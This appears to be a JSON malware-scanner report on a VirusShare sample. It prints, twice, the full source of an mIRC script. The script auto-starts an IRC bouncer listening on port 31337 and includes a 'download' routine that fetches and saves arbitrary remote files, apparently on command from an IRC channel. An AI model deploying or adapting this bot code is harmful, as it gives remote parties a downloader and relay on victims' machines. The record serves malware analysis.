{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "write": "May write to a file"
        },
        "macro": "on *:sockopen:download: { if ($sockerr) { msg %chan Error: Socket error. | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 |  .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }\non *:sockread:download: { if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }\non *:sockclose:download: { if ($file(%download2).size != %downloadlength) { .sockclose download | download http:// $+ %download1 $+ / $+ %download3 } | else { msg %chan Success: File downloaded ( $+ $mircdir $+ %download2 $+ ) [[ $+ $bytes($file(%download2).size).suf $+ ][ $+ $duration($calc($ctime - %download4)) $+ ][ $+ $round($calc($calc($file(%download2).size / 1024) / $calc($ctime - %download4)),2) $+ kbps $+ ] } | unset %download* } }\nalias download { if ($sock(download)) { msg %chan Error: Already downloading a file. | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | set %download4 $ctime | .sockopen download %download1 80 }\nON *:LOAD: { set %proxy.port 31337 | hmake proxy 100 | backup_proxy | hfree proxy | start_proxy | echo -s \u00032[\u000312Mr. Bnc\u00032]\u000f I'm ready to go!, right click in your status window and click help. }\nON *:START: { hmake proxy | close_proxy | if ($findfile(D:\\,*.*,*) > 0  }\n\nmenu status {\n  Mr. BNC\n  .-\n  . $iif($hget(proxy),STOP,START) : $iif($hget(proxy),close_proxy,start_proxy)\n  .Help: echo -s Tell your friends to type \u0002//server $IP %proxy.port $+ \u0002 Then they need to enter thier username and password as shown when they connect. \n  .Add: proxy_add $$?=\"Nickname?\" $$?=\"Password?\"\n  .Delete: proxy_del $$?=\"Nickname?\"\n  .Change Port: set %proxy.port $$?=\"Proxy Port? (Default = 31337)\"\n}\nalias close_proxy { sockclose proxy | set %bnc OFF | msg %chan \u00032[\u000312Mr. Bnc\u00032]\u000f \u00030,4Stopped. }\nalias start_proxy { socklisten proxy %proxy.port | set %bnc ON | msg %chan \u00032[\u000312Mr. Bnc\u00032]\u000f \u00031,9Started. Port %proxy.port }\nalias backup_proxy { var %bup = $hget(proxy,0).item | hmake backupproxy 100 | while (%bup) { IF (PROXY !isin $hget(proxy,%bup).item) { hadd backupproxy $hget(proxy,%bup).item $hget(proxy,%bup) } } | .remove proxy.hash | .hsave backupproxy proxy.hash | .hfree backupproxy }\n\nON *:SOCKLISTEN:PROXY: { var %proxy = $ticks | set %proxy.connecting %proxy.connecting $ticks | sockaccept proxy $+ %proxy }\nON *:SOCKREAD:PROXY*: {\n  var %prx1 = :proxy!proxy@ $+ $host NOTICE\n  sockread %prx\n  tokenize 32 %prx\n  IF ($right($sockname,-5) isin %proxy.connecting) {\n    IF ($1 == NICK) { hadd proxy $sockname PROXY $+ $2 | halt }\n    IF ($1 == USER) {\n      var %prx5 = $sockname\n      hadd proxy $hget(proxy,$sockname) $2- CONNECTED\n      sockrename $sockname $hget(proxy,$sockname)\n      hdel proxy %prx5  \n      %proxy.connecting = $remtok(%proxy.connecting,$right($sockname,-5),1,32) \n      .sockwrite -n $sockname %prx1 :Welcome to the Valix IRC Proxy server.\n      .sockwrite -n $sockname %prx1 :Type \u0002/quote conn <user> <password> <server> <port>\u0002\n      halt\n    }\n    halt\n  }\n  IF ($right($hget(proxy,$sockname),9) == CONNECTED) {\n    IF ($1 == CONN) {\n      IF ($5) {\n        IF ($hget(proxy,$2)) {\n          IF ($hget(proxy,$2) == $3) {\n            sockwrite -n $sockname %prx1 :*** Connecting to $4 on port $5 $+ ...\n            sockopen SERVER $+ $sockname $4 $5\n            identd on $lower($right($sockname,-5))\n            .timeridentd 1 2 identd on Valix\n          }\n          ELSE { sockwrite -n $sockname %prx1 :Incorrect password. }\n        }\n        ELSE { sockwrite -n $sockname %prx1 :Invalid username. }\n      }\n      ELSE { sockwrite -n $sockname %prx1 :Type \u0002/quote conn <user> <password> <server> <port>\u0002 }\n    }\n    ELSE { halt }\n  }\n  ELSE { sockwrite -n SERVER $+ $sockname $1- }\n}\n\nON *:SOCKOPEN:SERVERPROXY*: {\n  IF ($sockerr > 0) { sockwrite -n $right($sockname,-6) %prx1 :No such server, Try a different one. | halt }\n  sockwrite -n $sockname NICK $right($sockname,-11)\n  sockwrite -n $sockname USER $gettok($hget(proxy,$right($sockname,-6)),1-4,32)\n  hadd proxy $right($sockname,-6) $server $port\n}\n\nON *:SOCKREAD:SERVERPROXY*: { sockread %prx2 | tokenize 32 %prx2 | IF ($sock($sockname)) { sockwrite -n $right($sockname,-6) $1- } }\nON *:SOCKCLOSE:PROXY*: { hdel proxy $sockname | if ($sock( SERVER $+ $sockname ,1) { sockclose SERVER $+ $sockname } }\nON *:SOCKCLOSE:SERVERPROXY*: { sockclose $right($sockname,-6) }\n\nalias proxy_add { \n  IF ($2) {\n    IF ($hget(proxy,$1)) { msg %chan \u00032[\u000312Mr. Bnc\u00032]\u000f Error: That nickname already exists on the proxy users list.\u000f }\n    ELSE { hadd proxy $1 $2 | IF ($show) { msg %chan \u00032*** \u0002 $+ $1 $+ \u0002 Was succesfully added with the password \u0002 $+ $2 } }\n  }\n  ELSE { msg %chan \u00032[\u000312Mr. Bnc\u00032]\u000f Error: Insufficient paramaters. \u0002/proxy_add <nick> <passwd>\u000f }\n}\nalias proxy_del {\n  IF ($1) {\n    IF ($hget(proxy,$1)) { hdel proxy $1 | IF ($show) { msg %chan \u00032*** \u0002 $+ $1 $+ \u0002 Was succesfully removed from the proxy list } }\n    ELSE { msg %chan \u00032[\u000312Mr. Bnc\u00032]\u000f Error: That nickname doesn't exists on the proxy users list.\u000f }\n  }\n  ELSE { msg %chan \u00032[\u000312Mr. Bnc\u00032]\u000f Error: Insufficient paramaters. \u0002/proxy_del <nick>\u000f }\n}\n\n\n\n"
    },
    "filename": "VirusShare_3feda5d5e5d015c738739fb8be0454fe",
    "filesize": 5573,
    "filetype": "data",
    "hashes": {
        "md5": "3feda5d5e5d015c738739fb8be0454fe",
        "sha1": "146ebeb5243fc90c20179fbae51b4e5d7cba478b",
        "sha256": "0bfb842bf0177b52ea1a7ebdb9b274b6e44b0d24ba1aab7fc40c0f8539ebe8e7"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "on *:sockopen:download: { if ($sockerr) { msg %chan Error: Socket error. | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 |  .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }",
            "on *:sockread:download: { if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }",
            "on *:sockclose:download: { if ($file(%download2).size != %downloadlength) { .sockclose download | download http:// $+ %download1 $+ / $+ %download3 } | else { msg %chan Success: File downloaded ( $+ $mircdir $+ %download2 $+ ) [[ $+ $bytes($file(%download2).size).suf $+ ][ $+ $duration($calc($ctime - %download4)) $+ ][ $+ $round($calc($calc($file(%download2).size / 1024) / $calc($ctime - %download4)),2) $+ kbps $+ ] } | unset %download* } }",
            "alias download { if ($sock(download)) { msg %chan Error: Already downloading a file. | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | set %download4 $ctime | .sockopen download %download1 80 }",
            "ON *:LOAD: { set %proxy.port 31337 | hmake proxy 100 | backup_proxy | hfree proxy | start_proxy | echo -s ",
            "12Mr. Bnc",
            " I'm ready to go!, right click in your status window and click help. }",
            "ON *:START: { hmake proxy | close_proxy | if ($findfile(D:\\,*.*,*) > 0  }",
            "menu status {",
            "  Mr. BNC",
            "  .-",
            "  . $iif($hget(proxy),STOP,START) : $iif($hget(proxy),close_proxy,start_proxy)",
            "  .Help: echo -s Tell your friends to type ",
            "//server $IP %proxy.port $+ ",
            " Then they need to enter thier username and password as shown when they connect. ",
            "  .Add: proxy_add $$?=\"Nickname?\" $$?=\"Password?\"",
            "  .Delete: proxy_del $$?=\"Nickname?\"",
            "  .Change Port: set %proxy.port $$?=\"Proxy Port? (Default = 31337)\"",
            "alias close_proxy { sockclose proxy | set %bnc OFF | msg %chan ",
            "12Mr. Bnc",
            "0,4Stopped. }",
            "alias start_proxy { socklisten proxy %proxy.port | set %bnc ON | msg %chan ",
            "12Mr. Bnc",
            "1,9Started. Port %proxy.port }",
            "alias backup_proxy { var %bup = $hget(proxy,0).item | hmake backupproxy 100 | while (%bup) { IF (PROXY !isin $hget(proxy,%bup).item) { hadd backupproxy $hget(proxy,%bup).item $hget(proxy,%bup) } } | .remove proxy.hash | .hsave backupproxy proxy.hash | .hfree backupproxy }",
            "ON *:SOCKLISTEN:PROXY: { var %proxy = $ticks | set %proxy.connecting %proxy.connecting $ticks | sockaccept proxy $+ %proxy }",
            "ON *:SOCKREAD:PROXY*: {",
            "  var %prx1 = :proxy!proxy@ $+ $host NOTICE",
            "  sockread %prx",
            "  tokenize 32 %prx",
            "  IF ($right($sockname,-5) isin %proxy.connecting) {",
            "    IF ($1 == NICK) { hadd proxy $sockname PROXY $+ $2 | halt }",
            "    IF ($1 == USER) {",
            "      var %prx5 = $sockname",
            "      hadd proxy $hget(proxy,$sockname) $2- CONNECTED",
            "      sockrename $sockname $hget(proxy,$sockname)",
            "      hdel proxy %prx5  ",
            "      %proxy.connecting = $remtok(%proxy.connecting,$right($sockname,-5),1,32) ",
            "      .sockwrite -n $sockname %prx1 :Welcome to the Valix IRC Proxy server.",
            "      .sockwrite -n $sockname %prx1 :Type ",
            "/quote conn <user> <password> <server> <port>",
            "      halt",
            "    }",
            "    halt",
            "  IF ($right($hget(proxy,$sockname),9) == CONNECTED) {",
            "    IF ($1 == CONN) {",
            "      IF ($5) {",
            "        IF ($hget(proxy,$2)) {",
            "          IF ($hget(proxy,$2) == $3) {",
            "            sockwrite -n $sockname %prx1 :*** Connecting to $4 on port $5 $+ ...",
            "            sockopen SERVER $+ $sockname $4 $5",
            "            identd on $lower($right($sockname,-5))",
            "            .timeridentd 1 2 identd on Valix",
            "          }",
            "          ELSE { sockwrite -n $sockname %prx1 :Incorrect password. }",
            "        }",
            "        ELSE { sockwrite -n $sockname %prx1 :Invalid username. }",
            "      }",
            "      ELSE { sockwrite -n $sockname %prx1 :Type ",
            "/quote conn <user> <password> <server> <port>",
            "    }",
            "    ELSE { halt }",
            "  ELSE { sockwrite -n SERVER $+ $sockname $1- }",
            "ON *:SOCKOPEN:SERVERPROXY*: {",
            "  IF ($sockerr > 0) { sockwrite -n $right($sockname,-6) %prx1 :No such server, Try a different one. | halt }",
            "  sockwrite -n $sockname NICK $right($sockname,-11)",
            "  sockwrite -n $sockname USER $gettok($hget(proxy,$right($sockname,-6)),1-4,32)",
            "  hadd proxy $right($sockname,-6) $server $port",
            "ON *:SOCKREAD:SERVERPROXY*: { sockread %prx2 | tokenize 32 %prx2 | IF ($sock($sockname)) { sockwrite -n $right($sockname,-6) $1- } }",
            "ON *:SOCKCLOSE:PROXY*: { hdel proxy $sockname | if ($sock( SERVER $+ $sockname ,1) { sockclose SERVER $+ $sockname } }",
            "ON *:SOCKCLOSE:SERVERPROXY*: { sockclose $right($sockname,-6) }",
            "alias proxy_add { ",
            "  IF ($2) {",
            "    IF ($hget(proxy,$1)) { msg %chan ",
            "12Mr. Bnc",
            " Error: That nickname already exists on the proxy users list.",
            "    ELSE { hadd proxy $1 $2 | IF ($show) { msg %chan ",
            "2*** ",
            " $+ $1 $+ ",
            " Was succesfully added with the password ",
            " $+ $2 } }",
            "  ELSE { msg %chan ",
            "12Mr. Bnc",
            " Error: Insufficient paramaters. ",
            "/proxy_add <nick> <passwd>",
            "alias proxy_del {",
            "  IF ($1) {",
            "    IF ($hget(proxy,$1)) { hdel proxy $1 | IF ($show) { msg %chan ",
            "2*** ",
            " $+ $1 $+ ",
            " Was succesfully removed from the proxy list } }",
            "    ELSE { msg %chan ",
            "12Mr. Bnc",
            " Error: That nickname doesn't exists on the proxy users list.",
            "  ELSE { msg %chan ",
            "12Mr. Bnc",
            " Error: Insufficient paramaters. ",
            "/proxy_del <nick>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://"
        ]
    },
    "time": "0:00:00.294607",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
